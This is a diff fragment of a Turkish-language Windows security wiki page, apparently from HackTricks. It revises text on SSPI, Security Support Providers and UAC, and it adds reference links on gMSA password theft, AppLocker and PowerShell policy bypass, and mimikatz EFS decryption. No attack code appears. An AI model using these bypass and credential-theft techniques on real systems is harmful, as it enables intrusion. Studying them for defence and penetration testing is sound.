+SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) adı verilir, her Windows makinesinin içinde bir DLL olarak bulunurlar ve iletişim kurabilmeleri için her iki makinenin de aynı SSP'yi desteklemesi gerekir.
 
-### Ana SSP'ler
+### Main SSPs
 
-- **Kerberos**: Tercih edilen
+- **Kerberos**: Tercih edilen yöntem
 - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** and **NTLMv2**: Uyumluluk nedenleriyle
+- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Web sunucuları ve LDAP için, parola MD5 hash biçimindedir
+- **Digest**: Web sunucuları ve LDAP; parola bir MD5 hash'i biçimindedir
 - %windir%\Windows\System32\Wdigest.dll
 - **Schannel**: SSL ve TLS
 - %windir%\Windows\System32\Schannel.dll
@@ -279,17 +279,20 @@ SSPI, iletişim kurmak isteyen iki makine için uygun protokolü belirlemekten s
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) yönetici yetkisi gerektiren işlemler için bir **onay istemi** sağlayan bir özelliktir.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş yetkilere sahip işlemler için bir onay istemi** sağlayan bir özelliktir.
 
 
 {{#ref}}
 uac-user-account-control.md
 {{#endref}}
 
-## Referanslar
+## References
 
-- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
-- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
-- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
+- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
+- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
+- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
 
 {{#include ../../banners/hacktricks-training.md}}
